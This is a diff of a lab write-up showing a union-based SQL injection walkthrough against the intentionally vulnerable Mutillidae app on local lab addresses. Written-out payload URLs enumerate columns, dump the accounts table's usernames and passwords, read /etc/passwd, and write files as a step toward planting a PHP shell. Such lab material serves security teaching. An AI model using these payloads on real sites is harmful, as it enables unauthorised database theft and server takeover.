@@ -61,18 +61,17 @@ Union-based SQL injection
 UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”
 
 After logging out, Now choose the menu as shown below: img
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.11.png)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.12.png)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.13.png)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.14.png)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.15.png)
+
 ![Screenshot 2024-04-28 224358](https://github.com/Narasimhan05/sqlinjection/assets/132819871/72e80f17-a69e-4683-99f8-9631bde7031d)
 ![Screenshot 2024-04-28 224354](https://github.com/Narasimhan05/sqlinjection/assets/132819871/cdc7c92f-e9f3-48f7-bfa2-39e12471b70b)
 ![Screenshot 2024-04-28 224349](https://github.com/Narasimhan05/sqlinjection/assets/132819871/a239726d-47cd-4341-9d58-672dffb42e39)
+![Screenshot 2024-04-28 224342](https://github.com/Narasimhan05/sqlinjection/assets/132819871/2a75f86f-8864-46f5-87c3-d79c5bfd9bae)
+![Screenshot 2024-04-28 224337](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f096cd0b-0a61-4e8e-a59d-21c7b5d5ea69)
 
 From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.16.png)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.17.png)
+
+![Screenshot 2024-04-28 224318](https://github.com/Narasimhan05/sqlinjection/assets/132819871/bba70e25-f771-4809-a1a7-859466a5b599)
+![Screenshot 2024-04-28 224313](https://github.com/Narasimhan05/sqlinjection/assets/132819871/b225b375-9a58-428e-83d6-e8ea7073bb1e)
 
 Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.
 
@@ -82,29 +81,32 @@ http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%2
 
 After adding the order by 6 into the existing url , the following error statement will be obtained:
 
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.19.png)
+![Screenshot 2024-04-28 224307](https://github.com/Narasimhan05/sqlinjection/assets/132819871/75760f80-92cd-4839-945b-df252095d9c5)
+
 When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.20.png)
+![Screenshot 2024-04-28 224302](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0a1ebd33-f44a-4224-8dac-68c04c59ff8d)
 
 As it is having 5 columns the query worked fine and it provides the correct result
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.21.png)
+![Screenshot 2024-04-28 224252](https://github.com/Narasimhan05/sqlinjection/assets/132819871/05660912-ffbe-464b-ad9f-1c78c1a53f8d)
+
 Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.22.png)
+![Screenshot 2024-04-28 224244](https://github.com/Narasimhan05/sqlinjection/assets/132819871/28d49bb1-1e31-4db5-a1ea-808a3663dbad)
 
 As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.23.png)
+![Screenshot 2024-04-28 224240](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f0ef1ee6-8060-457f-87af-9b4b606bb8d7)
 
 Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details
 
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.24.png)
+![Screenshot 2024-04-28 224234](https://github.com/Narasimhan05/sqlinjection/assets/132819871/991f71ad-33bb-4cfb-b8da-3a778259bcb0)
+
 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.
 
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.25.png)
+![Screenshot 2024-04-28 224229](https://github.com/Narasimhan05/sqlinjection/assets/132819871/104e1530-9a9d-4fd7-92df-2b143331e1d1)
 
 The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
 
@@ -117,9 +119,10 @@ Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns wher
 Here we are trying to extract column names from the “accounts” table.
 
 The column names of the accounts is displayed below for the following url:
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.26.png)
+![Screenshot 2024-04-28 224224](https://github.com/Narasimhan05/sqlinjection/assets/132819871/86dda9ec-9c81-410f-900b-6270d292d817)
+
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.27.png)
+![Screenshot 2024-04-28 224220](https://github.com/Narasimhan05/sqlinjection/assets/132819871/3b9b5de0-8249-4fc1-a92d-5a83d5e4ba16)
 
 The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
 
@@ -130,24 +133,28 @@ In MySQL, the table “information_schema.columns” gives data about columns in
 Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).
 
 Here we are trying to extract column names from the “accounts” table.
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.28.png)
+![Screenshot 2024-04-28 224205](https://github.com/Narasimhan05/sqlinjection/assets/132819871/8fc0e551-97f6-47da-a7dd-4218bbbdefaa)
+
 The column names of the accounts is displayed below for the following url:
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.29.png)
+![Screenshot 2024-04-28 224158](https://github.com/Narasimhan05/sqlinjection/assets/132819871/42bf6eb5-993a-4260-95e2-7a585a525b96)
+
 Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.
 
 Ex: (union select 1,username,password,is_admin,5 from accounts).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.30.png)
+![Screenshot 2024-04-28 224152](https://github.com/Narasimhan05/sqlinjection/assets/132819871/0f23cd30-7374-483c-b9b5-85f3d3984ed6)
+
 Reading and writing files on the web-server
 We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.
 
 Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).
 
 http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
-![alt text](VirtualBox_kali-linux-2024.1-virtualbox-amd64_28_04_2024_15_29_56.31.png)
+![Screenshot 2024-04-28 224144](https://github.com/Narasimhan05/sqlinjection/assets/132819871/f3c32031-7fa7-4089-bdfb-a9726391c4f8)
+
 the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).
 
 ## RESULT:
